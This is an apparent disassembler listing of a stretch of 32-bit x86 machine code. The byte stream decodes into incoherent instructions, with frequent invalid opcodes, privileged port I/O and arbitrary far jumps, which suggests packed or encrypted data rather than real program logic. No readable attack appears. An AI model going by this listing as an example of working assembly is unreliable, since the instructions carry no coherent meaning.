  413d01:	adc    eax,0xa94b3d96
  413d06:	cmp    al,0x81
  413d08:	or     al,BYTE PTR [edi+ebx*2-0x4cdfdf6e]
  413d0f:	leave  
  413d10:	xchg   ebp,eax
  413d11:	xor    ebp,DWORD PTR [ecx+0x54385ece]
  413d17:	call   0x7106:0x7ba3a3cb
  413d1e:	popa   
  413d1f:	xchg   esi,eax
  413d20:	and    BYTE PTR [ebx+0x44],cl
  413d23:	dec    ecx
  413d24:	adc    eax,0xebf0bd20
  413d29:	or     al,0x67
  413d2b:	out    0xc9,al
  413d2d:	inc    esp
  413d2e:	mov    ah,0xe
  413d30:	push   edi
  413d31:	std    
  413d32:	pop    es
  413d33:	and    eax,0xdc72d5b2
  413d38:	(bad)  
  413d39:	call   0x4676a5e
  413d3e:	add    eax,0xdbd536c1
  413d43:	jge    0x413cf1
  413d45:	sar    DWORD PTR [edx-0x51d69ff9],1
  413d4b:	sub    BYTE PTR [ebp+eiz*4-0x409ab7a4],dh
  413d52:	pusha  
  413d53:	in     eax,dx
  413d54:	fld    DWORD PTR [esi-0x7c]
  413d57:	sbb    al,0xb1
  413d5a:	mov    edx,0x4da1f078
  413d5f:	xor    BYTE PTR [esi+0x6d],cl
  413d62:	sub    al,0xd8
  413d64:	loop   0x413cf5
  413d66:	ret    
  413d67:	mov    bh,0x17
  413d69:	(bad)  
  413d6b:	in     al,dx
  413d6c:	or     BYTE PTR [eax-0x68e906ec],ah
  413d72:	outs   dx,DWORD PTR ds:[esi]
  413d73:	push   ss
  413d74:	rcl    DWORD PTR [edx+0x70],cl
  413d77:	add    esi,ebx
  413d79:	mov    dh,0xd1
  413d7b:	pop    ss
  413d7c:	data16 cmp al,0xf9
  413d7f:	outs   dx,BYTE PTR ds:[esi]
  413d80:	fs mov ch,0x66
  413d83:	xchg   ebx,eax
  413d84:	mov    al,ds:0x399c3254
  413d89:	(bad)  
  413d8a:	fsubr  DWORD PTR [ebx+0x3eb40f3]
  413d90:	push   ebp
  413d91:	aad    0x13
  413d93:	test   al,0x2b
  413d95:	sti    
  413d96:	sahf   
  413d97:	and    al,0x34
  413d99:	inc    edi
  413d9a:	pop    es
  413d9b:	cmp    edi,ecx
  413d9d:	mov    edx,0x3dd02d9f
  413da2:	add    eax,0xfc8932c8
  413da7:	push   esp
  413da8:	xor    edx,ecx
  413daa:	repnz popa 
  413dac:	int3   
  413dad:	in     eax,0xc0
  413daf:	mov    esi,0x5e940548
  413db4:	ret    0x8e00
  413db7:	dec    ebp
  413db8:	dec    ecx
  413db9:	inc    eax
  413dba:	sar    bh,cl
  413dbc:	shl    DWORD PTR [ecx+esi*1],cl
  413dbf:	pop    esp
  413dc0:	inc    edi
  413dc1:	lds    ebp,FWORD PTR [esi+esi*1-0x20bc11ff]
  413dc8:	je     0x413dc1
  413dca:	dec    eax
  413dcb:	das    
  413dcc:	sbb    dl,bh
  413dce:	sub    BYTE PTR [esi+0x31],dl
  413dd1:	lahf   
  413dd2:	xchg   ebp,eax
  413dd3:	xchg   edx,eax
  413dd4:	mov    al,0x63
  413dd6:	add    al,0x77
  413dd8:	dec    esp
  413dd9:	inc    edx
  413dda:	mov    DWORD PTR [edi],0x90b503c9
  413de0:	stc    
  413de1:	cmc    
  413de2:	popf   
  413de3:	(bad)  
  413de6:	xlat   BYTE PTR ds:[ebx]
  413de7:	cmp    eax,0xf4a2e3a5
  413dec:	inc    ecx
  413ded:	out    0x1b,eax
  413def:	out    0x51,al
  413df1:	outs   dx,BYTE PTR ds:[esi]
  413df2:	sbb    bh,dh
  413df4:	cdq    
  413df5:	push   0x54
  413df7:	imul   ebp,DWORD PTR [esi-0x6b551e83],0x90b809c3
  413e01:	mov    bl,0xaa
  413e03:	lods   eax,DWORD PTR ds:[esi]
  413e04:	mov    edx,DWORD PTR [ecx+0x2d828a98]
  413e0a:	gs push ecx
  413e0c:	inc    ecx
  413e0d:	push   edi
  413e0e:	popf   
  413e0f:	jnp    0x413e72
  413e11:	mov    eax,0x4f4ad562
  413e16:	inc    ecx
  413e17:	and    esp,DWORD PTR [edx+0x13]
  413e1a:	mov    dl,0x9b
  413e1c:	mov    edi,0xa067cb61
  413e21:	enter  0xec7a,0xb8
  413e25:	push   0x676a05d0
  413e2a:	push   esi
  413e2b:	cs ja  0x413ded
  413e2e:	fwait
  413e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e30:	jnp    0x413dfc
  413e32:	fmul   QWORD PTR [ecx-0x2080e943]
  413e38:	fwait
  413e39:	sbb    eax,0xf5d0505e
  413e3e:	ins    DWORD PTR es:[edi],dx
  413e3f:	fnstsw WORD PTR [edi-0xf]
  413e42:	addr16 dec esi
  413e44:	and    ch,BYTE PTR [ebp+ebp*1-0x4eed2236]
  413e4b:	jmp    0xae6dd103
  413e50:	out    dx,eax
  413e51:	scas   al,BYTE PTR es:[edi]
  413e52:	jp     0x413e57
  413e54:	cmp    cl,cl
  413e56:	sub    ah,0x50
  413e59:	cmp    dl,0x94
  413e5c:	push   ss
  413e5d:	cdq    
  413e5e:	lock xor ecx,DWORD PTR [esi-0x4f]
  413e62:	sub    DWORD PTR [ebx],eax
  413e64:	bound  edx,QWORD PTR [edi]
  413e66:	jg     0x413e4c
  413e68:	pop    edx
  413e69:	cmove  esp,edi
  413e6c:	mov    edx,0xfa025e8e
  413e71:	cmp    ah,BYTE PTR ds:0xf351635e
  413e77:	push   edx
  413e78:	les    ecx,FWORD PTR [esi]
  413e7a:	pop    esi
  413e7b:	aam    0x66
  413e7d:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e7f:	sbb    eax,0xd139d240
  413e84:	mov    fs,WORD PTR [edi-0x2e4260ea]
  413e8a:	jg     0x413e8f
  413e8c:	leave  
  413e8d:	xor    esp,DWORD PTR [edi-0x3b]
  413e90:	mov    ds:0x21756892,al
  413e95:	mov    ch,0xa8
  413e97:	push   0xffffff8b
  413e99:	fcomip st,st(0)
  413e9b:	sbb    cl,BYTE PTR [edx-0x21afb46b]
  413ea1:	adc    eax,0xaf40e2d7
  413ea6:	mov    fs,WORD PTR [eax+edx*1]
  413ea9:	adc    dl,bh
  413eab:	pop    ds
  413eac:	scas   al,BYTE PTR es:[edi]
  413ead:	(bad)  
  413eaf:	adc    al,0xa
  413eb1:	je     0x413ea7
  413eb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413eb4:	lock shr DWORD PTR [ebp+0x2f05b434],1
  413ebb:	mov    al,ds:0x2db9fd5
  413ec0:	imul   ecx,edi,0xd894b9b8
  413ec6:	ins    DWORD PTR es:[edi],dx
  413ec7:	clc    
  413ec8:	mov    ecx,0x33187d46
  413ecd:	mov    cl,bh
  413ecf:	mov    bh,BYTE PTR [eax+0x13]
  413ed2:	jnp    0x413f11
  413ed4:	fistp  QWORD PTR [ebx]
  413ed6:	push   esi
  413ed7:	add    bh,BYTE PTR [eax+0x4ef4e4c6]
  413edd:	xchg   ebx,eax
  413ede:	mov    ah,0xfc
  413ee0:	mov    WORD PTR [esi-0x2f44b9d8],cs
  413ee6:	mov    dh,0x42
  413ee8:	aad    0x2e
  413eea:	or     esi,DWORD PTR [esi+0x27ea221f]
  413ef0:	xor    BYTE PTR [edi],0x49
  413ef3:	aam    0xab
  413ef5:	icebp  
  413ef6:	cwde   
  413ef7:	dec    eax
  413ef8:	(bad)  
  413ef9:	mov    eax,ebp
  413efb:	dec    ecx
  413efc:	mov    WORD PTR [ebx],?
  413efe:	inc    eax
  413eff:	stos   DWORD PTR es:[edi],eax
  413f00:	loop   0x413f30
  413f02:	mov    dh,0x79
  413f04:	loop   0x413f1a
  413f06:	mov    WORD PTR [eax],?
  413f08:	shr    DWORD PTR [edx-0x3b6540f9],cl
  413f0e:	mov    dh,0x1d
  413f10:	fwait
  413f11:	inc    esp
  413f12:	ins    BYTE PTR es:[edi],dx
  413f13:	out    dx,eax
  413f14:	jb     0x413f5b
  413f16:	pop    ebx
  413f17:	sub    al,0x8c
  413f19:	xchg   ebp,eax
  413f1a:	jne    0x413ea1
  413f1c:	stos   BYTE PTR es:[edi],al
  413f1d:	stc    
  413f1e:	jle    0x413f6c
  413f20:	fidiv  DWORD PTR [ebx-0x67]
  413f23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f24:	das    
  413f25:	bound  edx,QWORD PTR [ebp-0x45]
  413f28:	aad    0x1e
  413f2a:	std    
  413f2b:	or     esi,DWORD PTR [ebx]
  413f2d:	mov    ebx,0xc006ea9c
  413f32:	cmp    DWORD PTR [ebx],ecx
  413f34:	inc    ecx
  413f35:	mov    dl,0x48
  413f37:	aaa    
  413f38:	(bad)  
  413f39:	aas    
  413f3a:	fld    st(2)
  413f3c:	push   0x6f
  413f3e:	out    0xd8,al
  413f40:	out    dx,al
  413f41:	dec    ecx
  413f42:	sub    cl,al
  413f44:	je     0x413fa7
  413f46:	js     0x413ef5
  413f48:	push   ss
  413f49:	inc    ecx
  413f4a:	aaa    
  413f4b:	(bad)  
  413f4c:	std    
  413f4d:	sbb    al,0x0
  413f4f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  413f51:	pop    edi
  413f52:	add    dh,BYTE PTR [edi]
  413f54:	pushf  
  413f55:	mov    esp,0x1bf17ae8
  413f5a:	add    esp,DWORD PTR [esi+eax*1]
  413f5d:	xadd   DWORD PTR [ebx+0x28],esi
  413f61:	mov    es,WORD PTR [ecx+0x51]
  413f64:	jle    0x413f86
  413f66:	sub    dl,bl
  413f68:	push   ebp
  413f69:	cdq    
  413f6a:	dec    ecx
  413f6b:	inc    BYTE PTR [eax+0x2b]
  413f6e:	(bad)  
  413f6f:	test   al,0x5e
  413f71:	ja     0x413f35
  413f73:	mov    dh,0xcd
  413f75:	xor    DWORD PTR [edi],0xffffff8d
  413f78:	push   eax
  413f79:	scas   eax,DWORD PTR es:[edi]
  413f7a:	in     al,0x8a
  413f7c:	call   0x4bd36c04
  413f81:	sub    edi,DWORD PTR [eax]
  413f83:	pop    ss
  413f84:	loopne 0x413f34
  413f86:	cmp    ch,ah
  413f88:	sbb    eax,0x1fc62c6b
  413f8d:	or     edx,DWORD PTR [ebp+0x26]
  413f90:	inc    ebx
  413f91:	inc    ebp
  413f92:	(bad)  
  413f93:	jns    0x413f61
  413f95:	mov    dh,0x6a
  413f97:	shl    DWORD PTR [ebp*2+0x2d0b4c49],cl
  413f9e:	inc    ebp
  413f9f:	cmp    esp,DWORD PTR [edx-0x5a]
  413fa2:	lock jp 0x413fd0
  413fa5:	pop    es
  413fa6:	pop    eax
  413fa7:	jp     0x413f68
  413fa9:	idiv   BYTE PTR [esi-0x33]
  413fac:	add    DWORD PTR [edi],ebx
  413fae:	int    0x81
  413fb0:	jmp    0x413fe6
  413fb2:	jmp    0x3c33:0xab9d1624
  413fb9:	xor    bl,BYTE PTR [esi]
  413fbb:	or     ebx,DWORD PTR [edx+0x4ae75b1f]
  413fc1:	sub    ebx,DWORD PTR [eax+0x2f]
  413fc4:	jne    0x41403c
  413fc6:	ficom  DWORD PTR [edi+0x30]
  413fc9:	mov    eax,ds:0xd542dca1
  413fce:	lock dec eax
  413fd0:	jae    0x414015
  413fd2:	mov    ss,WORD PTR [ecx-0x7]
  413fd5:	ja     0x414021
  413fd7:	je     0x414044
  413fd9:	inc    edi
  413fda:	and    DWORD PTR [esi-0x9d9c029],edx
  413fe0:	jne    0x413fa1
  413fe2:	or     DWORD PTR [edi+edx*4+0x3f],esi
  413fe6:	out    0x36,al
  413fe8:	out    dx,al
  413fe9:	mov    eax,ds:0xc714b940
  413fee:	sub    esp,DWORD PTR [ebp+0x74]
  413ff1:	dec    ebx
  413ff2:	xchg   ebp,eax
  413ff3:	jnp    0x413fad
  413ff5:	push   eax
  413ff6:	xchg   ebx,eax
  413ff7:	adc    ecx,DWORD PTR [esi]
  413ff9:	pop    es
  413ffa:	(bad)  
  413ffb:	(bad)
  413ffe:	addr16 ret 0x1909
  414002:	jle    0x413f92
  414004:	mov    bl,0xca
  414006:	mov    bh,0x57
  414008:	repnz scas eax,DWORD PTR es:[edi]
  41400a:	stos   BYTE PTR es:[edi],al
  41400b:	sbb    eax,0xb04ea9ac
  414010:	sub    esi,ecx
  414012:	inc    ebx
  414013:	cmp    BYTE PTR [ecx],ah
  414015:	mov    esp,0xc5b284db
  41401a:	aaa    
  41401b:	sbb    ch,ch
  41401d:	ins    DWORD PTR es:[edi],dx
  41401e:	out    0xa2,eax
  414020:	fwait
  414021:	sub    DWORD PTR [ecx+0x10],eax
  414024:	sar    DWORD PTR ds:0xcac8cea3,cl
  41402a:	cmp    cl,bh
  41402c:	dec    ebx
  41402d:	xchg   edx,eax
  41402e:	imul   ecx,DWORD PTR [ebx+0xa],0x6558c459
  414035:	mov    ah,BYTE PTR [edi-0x19b78267]
  41403b:	jnp    0x41409c
  41403d:	out    0x1f,eax
  41403f:	fst    DWORD PTR fs:[esi]
  414042:	mov    al,ds:0xd8bd8ab0
  414047:	dec    ebp
  414048:	js     0x413fe1
  41404a:	mov    ds,WORD PTR [eax+0x6a8c2458]
  414050:	clc    
  414051:	pop    edi
  414052:	into   
  414053:	fisubr WORD PTR [edi+edx*2]
  414056:	adc    dl,BYTE PTR [ebx+0x5033ab97]
  41405c:	pop    ebp
  41405d:	scas   eax,DWORD PTR es:[edi]
  41405e:	hlt    
  41405f:	mov    ecx,0x2f21ffa0
  414064:	adc    DWORD PTR [ebx-0x24],eax
  414067:	ins    DWORD PTR es:[edi],dx
  414068:	xor    edx,DWORD PTR [edx+0x455726e3]
  41406e:	or     BYTE PTR [esi+ecx*1-0x7e36d8de],ch
  414075:	daa    
  414076:	mov    cl,0x7e
  414078:	out    dx,al
  414079:	jae    0x414000
  41407b:	xchg   DWORD PTR [edx],ecx
  41407d:	sbb    BYTE PTR [esi+0x700b57d5],dh
  414083:	push   ecx
  414084:	fild   DWORD PTR [esi+esi*1-0x13]
  414088:	ficomp WORD PTR [esi-0x2d611d85]
  41408e:	mov    edi,0x3496bdb4
  414093:	and    eax,DWORD PTR [ecx]
  414095:	in     eax,0xa2
  414097:	xchg   esi,eax
  414098:	jno    0x414062
  41409a:	mov    ds,WORD PTR [edx+0x1b]
  41409d:	mov    al,0x43
  41409f:	sbb    bl,BYTE PTR [esi+eax*4-0x52241b80]
  4140a6:	adc    dl,BYTE PTR [esi-0x68]
  4140a9:	or     BYTE PTR [esp+eiz*2],bh
  4140ac:	(bad)  
  4140ad:	sub    bh,BYTE PTR [ebp+0x66]
  4140b0:	sbb    al,0x5e
  4140b2:	push   edi
  4140b3:	shr    ah,0x96
  4140b6:	hlt    
  4140b7:	xchg   DWORD PTR [ebx+0x23],esi
  4140ba:	lahf   
  4140bb:	cdq    
  4140bc:	into   
  4140bd:	lods   eax,DWORD PTR ds:[esi]
  4140be:	jb     0x4140cd
  4140c0:	mov    esi,esi
  4140c2:	test   eax,0xcb3450ae
  4140c7:	cmp    DWORD PTR [ebx+0x3c],ebx
  4140ca:	popf   
  4140cb:	inc    esi
  4140cc:	push   ds
  4140cd:	jb     0x414140
  4140cf:	popf   
  4140d0:	add    eax,0x3367c7f6
  4140d5:	scas   al,BYTE PTR es:[edi]
  4140d6:	retf   
  4140d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140d8:	jl     0x414091
  4140da:	call   0x75f0dfa4
  4140df:	jnp    0x414128
  4140e1:	in     al,dx
  4140e2:	retf   
  4140e3:	sbb    eax,0xaf12225c
  4140e8:	dec    edi
  4140e9:	shr    BYTE PTR [ebx+0x4b198717],1
  4140ef:	or     DWORD PTR [edi],0x78
  4140f2:	sbb    eax,0xa7a92671
  4140f7:	jg     0x414108
  4140f9:	test   BYTE PTR [ecx+0x30a61726],bl
  4140ff:	mov    BYTE PTR [eax+0x55dc9ea4],bh
  414105:	ds (bad) 
  414107:	cmp    eax,0x7e6464ea
  41410c:	ja     0x4140a6
  41410e:	ret    0xae33
  414111:	xchg   ebx,eax
  414112:	cmp    al,0x56
  414114:	pop    ds
  414115:	ret    
  414116:	push   0x93418802
  41411b:	retf   
  41411c:	in     eax,0x44
  41411e:	gs pop esi
  414120:	xchg   ebp,eax
  414121:	inc    dh
  414123:	dec    edi
  414124:	arpl   bx,di
  414126:	adc    DWORD PTR [edi],ebp
  414128:	mov    dl,0x1b
  41412a:	push   ss
  41412b:	mov    esi,0x8f86cd32
  414130:	push   ecx
  414131:	sbb    BYTE PTR [eax+0x74],0x5d
  414135:	mov    dl,0x7c
  414137:	fcomp  DWORD PTR [ecx+0x64]
  41413a:	punpckhwd mm3,QWORD PTR [ebx-0x50]
  41413e:	dec    eax
  41413f:	push   esi
  414140:	add    dh,0x23
  414143:	push   ebx
  414144:	inc    eax
  414145:	in     al,0x6f
  414147:	pop    edi
  414148:	pop    ecx
  414149:	xlat   BYTE PTR ds:[ebx]
  41414a:	das    
  41414b:	mov    esp,0xb29e91b0
  414150:	add    eax,0xa45c1831
  414155:	mov    edi,0xddb899c
  41415a:	push   ebx
  41415b:	ja     0x41417c
  41415d:	sbb    al,0x55
  41415f:	jne    0x41410f
  414161:	hlt    
  414162:	jl     0x4140ef
  414164:	mov    WORD PTR [esi-0x6d],es
  414167:	or     DWORD PTR [edi],eax
  414169:	push   ss
  41416a:	adc    BYTE PTR [ebx],bl
  41416c:	outs   dx,BYTE PTR ds:[esi]
  41416d:	push   esi
  41416e:	cmp    edx,edi
  414170:	cmc    
  414171:	sbb    BYTE PTR [ebx],0x34
  414174:	nop
  414175:	adc    bh,al
  414177:	test   DWORD PTR [edx+0x1f],esp
  41417a:	je     0x414126
  41417c:	push   esi
  41417d:	rcr    DWORD PTR [edi],cl
  41417f:	and    ebx,DWORD PTR [edx+0x5f]
  414182:	sub    edi,DWORD PTR [ebx+0x12]
  414185:	cs push cs
  414187:	mov    ch,0xf5
  414189:	lock pop ebp
  41418b:	test   BYTE PTR [edx+edx*8],cl
  41418e:	fidiv  WORD PTR gs:[eax]
  414191:	and    al,0x95
  414193:	dec    edi
  414194:	or     eax,0xf67bb81f
  414199:	les    esp,FWORD PTR [edi-0x6a]
  41419c:	in     al,0xc8
  41419e:	push   ecx
  41419f:	mov    edx,0x9bc48249
  4141a4:	fistp  WORD PTR [ecx]
  4141a6:	or     eax,0x6977a88f
  4141ab:	mov    bl,0xf0
  4141ad:	push   ecx
  4141ae:	aam    0xc4
  4141b0:	ins    BYTE PTR es:[edi],dx
  4141b1:	sub    dh,BYTE PTR [edx*8-0x5f3df76f]
  4141b8:	sar    ebx,cl
  4141ba:	test   DWORD PTR [ecx+0x4a],edx
  4141bd:	mov    al,BYTE PTR [ecx-0x182c7d83]
  4141c3:	mov    ?,WORD PTR [edx]
  4141c5:	leave  
  4141c6:	dec    ebx
  4141c7:	pop    edi
  4141c8:	xchg   ecx,eax
  4141c9:	jle    0x4141dc
  4141cb:	push   ebp
  4141cc:	fwait
  4141cd:	push   ss
  4141ce:	dec    edi
  4141cf:	lea    eax,[ebx-0x3121004c]
  4141d5:	jns    0x414162
  4141d7:	pop    ecx
  4141d8:	cwde   
  4141d9:	push   0x8e31d80f
  4141de:	pop    ds
  4141df:	or     edx,DWORD PTR [ebx+0x7d7dcd0e]
  4141e5:	fld    TBYTE PTR [edi+0x22]
  4141e8:	(bad)  
  4141e9:	and    bl,BYTE PTR [ebx+0x14]
  4141ec:	pop    ebp
  4141ed:	inc    ecx
  4141ee:	pop    eax
  4141ef:	fbld   TBYTE PTR [esi+0x58a89173]
  4141f5:	shr    BYTE PTR [edx-0x329b1c4c],1
  4141fb:	scas   al,BYTE PTR es:[edi]
  4141fc:	pop    edi
  4141fd:	mov    al,0x85
  4141ff:	push   0xffffff84
  414201:	jbe    0x414260
  414203:	mov    ?,WORD PTR [eax-0x7f]
  414206:	push   0x77
  414208:	pop    es
  414209:	xor    BYTE PTR [edi+0x35627b86],cl
  41420f:	pop    es
  414210:	push   es
  414211:	adc    DWORD PTR [esi+0x5f],ebx
  414214:	or     DWORD PTR [ecx+0x7f],edx
  414217:	xchg   DWORD PTR [eax+0x5],ebx
  41421a:	or     cl,cl
  41421c:	adc    DWORD PTR [ebp+0x27],edi
  41421f:	or     eax,0x6037a609
  414224:	or     ah,BYTE PTR [ebx+0x76]
  414227:	cmp    eax,0x590ef04f
  41422c:	icebp  
  41422d:	in     al,0x74
  41422f:	rcl    BYTE PTR [eax],1
  414231:	pop    ds
  414232:	push   edi
  414233:	shr    bh,1
  414235:	outs   dx,DWORD PTR ds:[esi]
  414236:	daa    
  414237:	push   cs
  414238:	pop    es
  414239:	mov    ds:0x36da7cbb,al
  41423e:	and    DWORD PTR [ebx],0x3e731001
  414244:	xor    ebp,ebx
  414246:	xchg   ebx,eax
  414247:	jge    0x41422e
  414249:	les    ecx,FWORD PTR [ebp-0x43]
  41424c:	mov    bl,0xc2
  41424e:	rdpmc  
  414250:	adc    BYTE PTR [ecx+0x38],al
  414253:	scas   eax,DWORD PTR es:[edi]
  414254:	jmp    0x5951:0x225e9328
  41425b:	xlat   BYTE PTR ds:[ebx]
  41425c:	sbb    al,0xee
  41425e:	cmp    al,0x39
  414260:	pop    es
  414261:	push   ebp
  414262:	bound  eax,QWORD PTR [ecx+0x4f435cb1]
  414268:	push   ss
  414269:	pop    esi
  41426a:	in     eax,0x7a
  41426c:	(bad)  
  41426d:	and    DWORD PTR [eax+ecx*2],ecx
  414270:	les    ebx,FWORD PTR [edx]
  414272:	loope  0x414299
  414274:	ja     0x414266
  414276:	pop    eax
  414277:	dec    ebp
  414278:	sar    DWORD PTR [ebp+0x4a1ba59f],0xe9
  41427f:	jmp    0x4055:0x8a56fcf3
  414286:	ror    BYTE PTR [ecx],1
  414288:	mov    bl,0x62
  41428a:	lea    ecx,[ebx]
  41428c:	xor    ch,BYTE PTR [ebx-0x64]
  41428f:	cmp    DWORD PTR [esi+0x72],edi
  414292:	mov    dl,0xfb
  414294:	jg     0x4142d1
  414296:	mov    edx,0x80c573f8
  41429b:	adc    dl,ch
  41429d:	pop    ebx
  41429e:	outs   dx,BYTE PTR ds:[esi]
  41429f:	out    dx,eax
  4142a0:	cmp    ecx,DWORD PTR [ecx+0x68]
  4142a3:	xor    esp,ebp
  4142a5:	cld    
  4142a6:	pop    esp
  4142a7:	sub    BYTE PTR [eax],0x28
  4142aa:	ficom  DWORD PTR [edi]
  4142ac:	or     dh,dl
  4142ae:	pop    ds
  4142af:	int    0xbb
  4142b1:	mov    bl,0xb5
  4142b3:	outs   dx,BYTE PTR ds:[esi]
  4142b4:	(bad)  
  4142b6:	xchg   edx,eax
  4142b7:	and    BYTE PTR [ecx-0x49],0xeb
  4142bb:	retf   
  4142bc:	(bad)  
  4142bd:	mov    cl,0xaa
  4142bf:	in     eax,0x4d
  4142c1:	and    esp,edx
  4142c3:	push   cs
  4142c4:	fstp   QWORD PTR [ecx+edx*8+0x16e7c1af]
  4142cb:	xor    eax,0x9d560c42
  4142d0:	loop   0x414307
  4142d2:	(bad)  
  4142d3:	(bad)  
  4142d4:	mov    edi,0xa957bdc1
  4142d9:	jno    0x41428f
  4142db:	cmp    ebp,DWORD PTR [edi-0x38184cec]
  4142e1:	xor    BYTE PTR [ecx-0x13a2eef3],0x18
  4142e8:	in     eax,0x48
  4142ea:	inc    edi
  4142eb:	xchg   edi,eax
  4142ec:	and    eax,0xf7928a9d
  4142f1:	fild   WORD PTR [ebp+ebx*8+0x24]
  4142f5:	outs   dx,BYTE PTR ds:[esi]
  4142f6:	push   ebp
  4142f7:	mov    ecx,DWORD PTR [edx-0x6f66a10b]
  4142fd:	push   ds
  4142fe:	xor    BYTE PTR [eax-0x5ce2b57c],al
  414304:	or     BYTE PTR [edi],dl
  414306:	stos   DWORD PTR es:[edi],eax
  414307:	pop    edi
  414308:	(bad)  
  414309:	xchg   esi,eax
  41430a:	and    al,0x10
  41430c:	mov    al,0x81
  41430e:	pop    ss
  41430f:	mov    bh,ah
  414311:	cmp    al,0xb6
  414313:	jbe    0x414346
  414315:	mov    bh,0x24
  414317:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414318:	inc    esp
  414319:	fsub   QWORD PTR ss:[eax+ecx*8]
  41431d:	push   edi
  41431e:	jae    0x414386
  414320:	push   0x5f
  414322:	ret    0x3917
  414325:	fistp  WORD PTR [ebp+esi*1+0x12]
  414329:	dec    edi
  41432a:	in     al,dx
  41432b:	push   eax
  41432c:	ins    BYTE PTR es:[edi],dx
  41432d:	xor    eax,0xe334d3e3
  414332:	mov    al,ds:0x60e58c25
  414337:	inc    ebx
  414338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414339:	cdq    
  41433a:	pop    ebx
  41433b:	fimul  DWORD PTR [eax]
  41433d:	cwde   
  41433e:	int3   
  41433f:	rol    esp,cl
  414341:	sub    cl,BYTE PTR [edx-0x24ba9f2a]
  414347:	mov    al,BYTE PTR [edi+0x60c4bbd]
  41434d:	stos   BYTE PTR es:[edi],al
  41434e:	adc    esp,DWORD PTR [eax-0x68]
  414351:	cwde   
  414352:	mov    ecx,0x2eb4733d
  414357:	jl     0x414388
  414359:	out    0x8c,eax
  41435b:	scas   al,BYTE PTR es:[edi]
  41435c:	sar    ebx,1
  41435e:	mov    ds:0x88fbd9b1,eax
  414363:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414364:	test   al,0x96
  414366:	jo     0x41438e
  414368:	mov    ebx,0x3fedb9ea
  41436d:	repnz data16 clc 
  414370:	std    
  414371:	popa   
  414372:	test   al,0x76
  414374:	pop    esp
  414375:	(bad)  
  414376:	rcr    DWORD PTR [esi+0x3edd9f42],1
  41437c:	mov    edx,0xcdf0467d
  414381:	sub    al,0x4
  414383:	mov    edx,0x4a06d13f
  414388:	inc    ecx
  414389:	idiv   ch
  41438b:	and    DWORD PTR ds:0x9f4cb94b,edi
  414391:	push   ds
  414392:	mov    ebp,0xfe14c90e
  414397:	mov    esp,0x7a477fa8
  41439c:	dec    BYTE PTR [edx]
  41439e:	xchg   DWORD PTR [eax+0x6b],ebx
  4143a1:	sbb    dh,bh
  4143a3:	mov    ebx,0xdd549f2e
  4143a8:	lods   eax,DWORD PTR ds:[esi]
  4143a9:	sbb    eax,0x2dd222b2
  4143ae:	add    DWORD PTR [edx+0x2c508844],0xffffffc7
  4143b5:	cmp    BYTE PTR [edi],dl
  4143b7:	sbb    dl,BYTE PTR [edx-0x26]
  4143ba:	and    esp,eax
  4143bc:	je     0x4143d2
  4143be:	or     dh,dh
  4143c0:	ins    BYTE PTR es:[edi],dx
  4143c1:	in     al,dx
  4143c2:	stos   BYTE PTR es:[edi],al
  4143c3:	cdq    
  4143c4:	inc    ecx
  4143c5:	mov    dh,0xc7
  4143c7:	inc    esi
  4143c8:	mov    bh,0x27
  4143ca:	int    0x64
  4143cc:	ret    0x8e86
  4143cf:	dec    edi
  4143d0:	ss jmp 0xcc12:0x26795c3d
  4143d8:	xchg   edi,eax
  4143d9:	sbb    BYTE PTR [eax+eiz*1-0x7c],cl
  4143dd:	sub    bh,dh
  4143df:	rdmsr  
  4143e1:	cmp    edi,DWORD PTR [edx+0x6e1bf0f7]
  4143e7:	dec    BYTE PTR [edi]
  4143e9:	or     DWORD PTR [edx+esi*4],0x8bed624e
  4143f0:	mov    ecx,0x5b2fc732
  4143f5:	(bad)  
  4143f6:	lahf   
  4143f7:	lds    ebx,FWORD PTR ds:0xfff58d6a
  4143fd:	sbb    eax,0x34d9486b
  414402:	cld    
  414403:	jne    0x414395
  414405:	sbb    eax,0xc224f0e9
  41440a:	fild   QWORD PTR [ebx]
  41440c:	pop    ebp
  41440d:	and    cl,0x30
  414410:	sub    BYTE PTR ds:0x4f3d9d62,ch
  414416:	jbe    0x41441d
  414418:	and    dl,BYTE PTR [edx+0xec80c41]
  41441e:	adc    DWORD PTR [esi],esi
  414420:	or     ecx,ebp
  414422:	(bad)  
  414423:	pop    ebp
  414424:	je     0x41443f
  414426:	push   ds
  414427:	aam    0x99
  414429:	or     al,0x2c
  41442b:	xchg   edi,eax
  41442c:	add    eax,0x4201a8f1
  414431:	mov    edx,DWORD PTR [esi]
  414433:	mov    DWORD PTR [edi+0xb],eax
  414436:	(bad)  
  414437:	xchg   ebx,eax
  414438:	jg     0x414450
  41443a:	mov    ds:0x1b09ac69,eax
  41443f:	inc    esi
  414440:	shl    edx,1
  414442:	adc    esi,DWORD PTR [ebx+0x3f]
  414445:	jl     0x4144b4
  414447:	into   
  414448:	test   BYTE PTR [ecx+0x18],ch
  41444b:	clc    
  41444c:	jnp    0x4143e5
  41444e:	cmc    
  41444f:	out    dx,al
  414450:	jmp    0x41445b
  414452:	mov    ds:0xd1656c7d,al
  414457:	pusha  
  414458:	je     0x414473
  41445a:	mov    ds,WORD PTR [edi-0x4647ed7d]
  414460:	cmp    DWORD PTR [edx-0x145be1c0],ebx
  414466:	xchg   edi,eax
  414467:	sbb    eax,DWORD PTR [esp+ecx*4+0x4233bca9]
  41446e:	ror    BYTE PTR [ecx+0x5e0bd946],cl
  414474:	jmp    0x1b9b:0x24a064f1
  41447b:	(bad)  
  41447d:	hlt    
  41447e:	stos   BYTE PTR es:[edi],al
  41447f:	jmp    0x330b3156
  414484:	in     eax,dx
  414485:	jno    0x414426
  414487:	je     0x414410
  414489:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41448a:	pop    eax
  41448b:	jb     0x4144ef
  41448d:	pop    esp
  41448e:	iret   
  41448f:	ret    
  414490:	push   edi
  414491:	jno    0x4144ef
  414493:	adc    DWORD PTR [edi+0x4c6cf9eb],ecx
  414499:	mov    dl,0xa4
  41449b:	push   ss
  41449c:	and    eax,0x56b698a3
